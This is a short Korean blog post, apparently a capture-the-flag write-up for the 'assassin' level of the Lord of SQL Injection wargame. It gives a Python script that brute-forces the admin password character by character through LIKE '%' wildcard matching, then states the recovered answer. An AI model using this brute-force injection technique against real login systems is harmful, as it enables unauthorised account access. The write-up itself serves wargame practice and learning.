---
layout: post
title: LOS Assassin 
date: 2015-10-23 00:37:00 +0900
category: Hacking
---


보아하니 %연산자를 이용한 공격이다.



pw like 'a%' 를 하게될 경우 a로 시작하는 모든 값을 검색한다. 즉 참이 된다

페이로드를 날려보면
```python
import requests
 
 
 
key=""
site=""
header={'Cookie':'PHPSESSID=vj0mghpj5cs5n24hh6pr7r4ne6'}
for j in range(1,12):
        for i in reversed(range(48,91)):
                site="http://los.sandbox.cash/chall/assassin_dbfabd99373ea659e58407bc1a8438c6.php?pw="
                site+=key+chr(i)+"%"
                print (site)
                r=requests.put(site,headers=header)
                
                if "<br><h2>Hello guest" in r.text:
                        break
        key+=chr(i)
        print ("\nkey"+key+"\n")
                
print ("\n\n\nF\nKey is :"+key+" \n\n\n")


```

해보면 



90d2fe10



이게 답이라고 한다.



근데 아무리 해도 안나오는걸 보면 admin pw랑 겹치는 부분이 있는것 같다.



그래서 9% 90% 이런식으로 다시 한번 해보았다. 



정답이었다. 



902EFD10









